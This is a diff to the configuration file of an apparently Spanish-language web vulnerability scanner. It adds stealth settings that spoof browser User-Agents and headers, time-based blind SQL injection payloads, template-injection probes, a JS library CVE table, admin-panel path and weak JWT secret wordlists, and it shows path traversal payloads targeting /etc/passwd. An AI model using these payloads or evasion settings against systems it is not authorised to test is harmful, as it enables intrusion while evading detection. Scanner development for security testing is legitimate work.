@@ -3,7 +3,53 @@ config.py — Toda la data: firmas, wordlists, payloads, constantes.
 """
 
 VERSION = "4.0"
-UA      = "Mozilla/5.0 (X11; Linux x86_64) VulnScanner-Pro/4.0"
+
+# ─── Default UA (fallback / no-stealth) ──────────────────────────────────────
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+
+# ─── Stealth Mode ─────────────────────────────────────────────────────────────
+STEALTH_DELAY_MIN = 0.15   # segundos mínimos entre peticiones activas
+STEALTH_DELAY_MAX = 0.80   # segundos máximos
+
+# Pool de User-Agents de navegadores reales (Chrome, Firefox, Safari, Edge)
+USER_AGENTS = [
+    # Chrome Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    # Chrome macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    # Firefox Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    # Firefox Linux
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    # Safari macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+    # Edge Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
+    # Chrome Android
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+    # Firefox macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
+    # Opera
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
+]
+
+# Headers adicionales para parecer un navegador real
+STEALTH_HEADERS = {
+    "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language":  "es-PE,es;q=0.9,en-US;q=0.8,en;q=0.7",
+    "Accept-Encoding":  "gzip, deflate, br",
+    "Cache-Control":    "no-cache",
+    "Pragma":           "no-cache",
+    "Sec-Fetch-Dest":   "document",
+    "Sec-Fetch-Mode":   "navigate",
+    "Sec-Fetch-Site":   "none",
+    "Sec-Fetch-User":   "?1",
+    "Upgrade-Insecure-Requests": "1",
+    "DNT":              "1",
+}
 
 # ─── Security Headers ──────────────────────────────────────────────────────────
 SECURITY_HEADERS = {
@@ -289,6 +335,192 @@ TRAVERSAL_PAYLOADS = [
     ("....//....//....//etc/passwd",      r"root:x:0:0"),
     ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:x:0:0"),
     ("..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]"),
+]
+
+# ─── SQLi Blind (Time-Based) Payloads ──────────────────────────────────────────────────────────────────────────────
+SQLI_BLIND_PAYLOADS = [
+    # (payload, db_type, sleep_seconds)
+    # MSSQL — objetivo principal ASP.NET/IIS
+    ("'; WAITFOR DELAY '0:0:5'--",          "MSSQL",   5),
+    ("1; WAITFOR DELAY '0:0:5'--",          "MSSQL",   5),
+    ("' OR '1'='1'; WAITFOR DELAY '0:0:5'--","MSSQL", 5),
+    ("1) WAITFOR DELAY '0:0:5'--",           "MSSQL",  5),
+    # MySQL
+    ("' OR SLEEP(5)--",                      "MySQL",   5),
+    ("1 OR SLEEP(5)--",                      "MySQL",   5),
+    ("' AND SLEEP(5) AND '1'='1",            "MySQL",   5),
+    # PostgreSQL
+    ("'; SELECT pg_sleep(5)--",              "PostgreSQL", 5),
+    ("1; SELECT pg_sleep(5)--",              "PostgreSQL", 5),
+    # Oracle
+    ("' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", "Oracle", 5),
+    # SQLite
+    ("' OR RANDOMBLOB(500000000/2)--",       "SQLite",  3),
+]
+SQLI_BLIND_SLEEP   = 5    # segundos que debe durar la respuesta para confirmar
+SQLI_BLIND_MARGIN  = 3.5  # marge de confirmación: respuesta debe tardar al menos esto
+
+# ─── SSTI Probes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+SSTI_PROBES = [
+    # (payload, expected_result, engine_name)
+    ("{{7*7}}",      "49",      "Jinja2/Twig/Nunjucks"),
+    ("${7*7}",       "49",      "Freemarker/Velocity/EL"),
+    ("<%= 7*7 %>",   "49",      "ERB/EJS"),
+    ("#{7*7}",       "49",      "Pebble/Slim"),
+    ("*{7*7}",       "49",      "Thymeleaf"),
+    ("{7*7}",        "49",      "Custom Engine"),
+    ("[[7*7]]",      "49",      "Velocity alt"),
+    ("{{7*'7'}}",    "7777777", "Jinja2 (distinguisher)"),
+]
+
+# ─── JS Library CVE Database ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+# lib_name_lower -> [(version_pattern, cve_list, severity, cvss, description)]
+JS_CVE_DB = {
+    "jquery": [
+        (r"jquery[/-]1\.[0-9]\.",
+         ["CVE-2020-11022", "CVE-2020-11023", "CVE-2019-11358"],
+         "HIGH", 6.1,
+         "jQuery <1.x: XSS vía manipulación de HTML y prototype pollution"),
+        (r"jquery[/-]2\.[0-2]\.",
+         ["CVE-2020-11022", "CVE-2019-11358"],
+         "HIGH", 6.1,
+         "jQuery 2.x: XSS vía .html()/.append() con input no sanitizado"),
+        (r"jquery[/-]3\.[0-4]\.",
+         ["CVE-2020-11022", "CVE-2020-11023"],
+         "MEDIUM", 6.1,
+         "jQuery 3.0-3.4: XSS vía parseHTML con tags option"),
+    ],
+    "bootstrap": [
+        (r"bootstrap[/-][23]\.[0-3]\.",
+         ["CVE-2019-8331", "CVE-2018-14041", "CVE-2018-14042"],
+         "MEDIUM", 6.1,
+         "Bootstrap <3.4.1: XSS vía data-template en tooltip/popover"),
+        (r"bootstrap[/-]4\.[0-2]\.",
+         ["CVE-2019-8331"],
+         "MEDIUM", 6.1,
+         "Bootstrap 4.0-4.2: XSS vía data-template attribute"),
+    ],
+    "angularjs": [
+        (r"angular[.-]1\.[0-7]\.",
+         ["CVE-2019-14863", "CVE-2020-7676"],
+         "HIGH", 6.1,
+         "AngularJS <1.8: XSS vía ng-attr-*, ng-class, interpolation bypass"),
+    ],
+    "lodash": [
+        (r"lodash[/-]([0-3]|4\.[0-9]|4\.1[0-6])\.",
+         ["CVE-2021-23337", "CVE-2020-8203", "CVE-2019-10744"],
+         "HIGH", 7.2,
+         "Lodash <4.17.21: Prototype pollution y command injection"),
+    ],
+    "moment": [
+        (r"moment[/-]([01]\.|2\.[0-8]\.|2\.9\.)",
+         ["CVE-2022-24785", "CVE-2022-31129"],
+         "HIGH", 7.5,
+         "Moment.js <2.29.4: ReDoS (regex DoS) y path traversal en locale"),
+    ],
+    "handlebars": [
+        (r"handlebars[/-][0-3]\.",
+         ["CVE-2021-23369", "CVE-2021-23383", "CVE-2019-19919"],
+         "CRITICAL", 9.8,
+         "Handlebars <4.7.7: Prototype pollution y RCE vía template injection"),
+    ],
+    "underscore": [
+        (r"underscore[/-]1\.[0-9]\.",
+         ["CVE-2021-23358"],
+         "HIGH", 7.2,
+         "Underscore.js <1.13.2: Arbitrary code execution vía template injection"),
+    ],
+}
+
+# ─── Admin Panel Paths ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ADMIN_PATHS = [
+    # Genéricos
+    "/admin", "/admin/", "/admin/login", "/admin/login.php", "/admin/login.aspx",
+    "/admin/index", "/admin/index.php", "/admin/index.aspx", "/admin/default.aspx",
+    "/administrator", "/administrator/", "/administrator/index.php",
+    "/adminpanel", "/admin-panel", "/admin_panel",
+    "/dashboard", "/dashboard/", "/dashboard/login", "/dashboard/admin",
+    "/cp", "/controlpanel", "/control-panel", "/panel", "/panel/",
+    "/manage", "/management", "/manager", "/manager/",
+    "/backend", "/backoffice", "/back-office",
+    "/portal", "/portal/login", "/portal/admin",
+    "/console", "/admin/console",
+    "/moderator", "/webmaster", "/webadmin",
+    "/siteadmin", "/site-admin", "/site_admin",
+    "/superadmin", "/super-admin", "/super_admin",
+    "/master", "/root", "/system", "/system/admin",
+    "/secure", "/secure/admin", "/secure/login",
+    "/private", "/internal", "/intranet",
+    "/auth", "/auth/login", "/auth/admin",
+    "/login", "/signin", "/sign-in",
+    "/user/login", "/users/login", "/account/login",
+    # ASP.NET / IIS específico
+    "/Admin/Default.aspx", "/Admin/Login.aspx", "/Admin/Index.aspx",
+    "/admin/Default.aspx", "/admin/Login.aspx",
+    "/Management/Login.aspx", "/Management/Default.aspx",
+    "/Administration/Login.aspx", "/Administration/Default.aspx",
+    "/Backend/Login.aspx", "/Backend/Default.aspx",
+    "/Panel/Login.aspx", "/Panel/Default.aspx",
+    "/Dashboard/Login.aspx", "/Dashboard/Default.aspx",
+    "/Administrador/Login.aspx", "/Administrador/Default.aspx",
+    "/Modulos/Admin", "/Modulos/Admin/Login.aspx",
+    "/Usuarios/Login.aspx", "/Usuarios/Admin.aspx",
+    "/Account/Login", "/Account/Login.aspx",
+    "/login.aspx", "/Login.aspx", "/default.aspx",
+    "/admin.aspx", "/Admin.aspx",
+    # PHP genérico
+    "/admin.php", "/admin/admin.php", "/adminlogin.php",
+    "/admin/home.php", "/admin/main.php", "/admin/control.php",
+    "/admin/config.php", "/admin/dashboard.php",
+    # WordPress
+    "/wp-admin", "/wp-admin/", "/wp-login.php",
+    "/wp-admin/admin.php", "/wp-admin/dashboard.php",
+    # Joomla
+    "/administrator", "/administrator/", "/administrator/index.php",
+    # Drupal
+    "/user/login", "/admin/user/login",
+    # Herramientas DB
+    "/phpmyadmin", "/phpmyadmin/", "/pma", "/pma/",
+    "/adminer.php", "/adminer", "/dbadmin",
+    "/mysql", "/mysqladmin", "/pgadmin",
+    # Java / Spring
+    "/actuator", "/actuator/", "/actuator/env", "/actuator/health",
+    "/spring-boot-admin", "/admin/spring",
+    "/management/", "/management/health",
+    # Python / Django
+    "/django-admin/", "/admin/",
+    # DevOps / monitoring
+    "/grafana", "/grafana/", "/kibana", "/kibana/",
+    "/zabbix", "/nagios", "/icinga",
+    "/jenkins", "/jenkins/", "/hudson",
+    "/sonar", "/sonarqube",
+    "/vault", "/consul", "/etcd",
+    # Correo
+    "/webmail", "/mail", "/roundcube", "/horde",
+    # Paneles de hosting
+    "/cpanel", "/whm", "/plesk", "/directadmin",
+    "/webmin", "/webmin/",
+    # API consoles
+    "/swagger-ui", "/swagger-ui.html", "/swagger-ui/",
+    "/api/swagger", "/api/docs", "/api-docs",
+    "/graphiql", "/graphiql/",
+    "/api-console", "/api-explorer",
+    # Setup / instalación
+    "/setup", "/install", "/installer", "/setup.php",
+    "/config", "/configuration", "/config.php",
+    # Logs
+    "/server-status", "/server-info",
+    "/server-status", "/server-info",
+    "/logs", "/log", "/error.log", "/access.log",
+]
+
+# ─── JWT Weak Secrets ─────────────────────────────────────────────────────────
+JWT_WEAK_SECRETS = [
+    "secret", "secret123", "admin", "admin123", "password", "password123",
+    "123456", "12345678", "qwerty", "test", "test123", "default",
+    "changeme", "key", "secretkey", "private", "privatekey",
+    "auth", "token", "jwt", "jwtsecret", "api", "apikey",
+    "supersecret", "mysecret", "secret_key", "secret-key",
 ]
 
 # ─── Subdomain Wordlist ────────────────────────────────────────────────────────
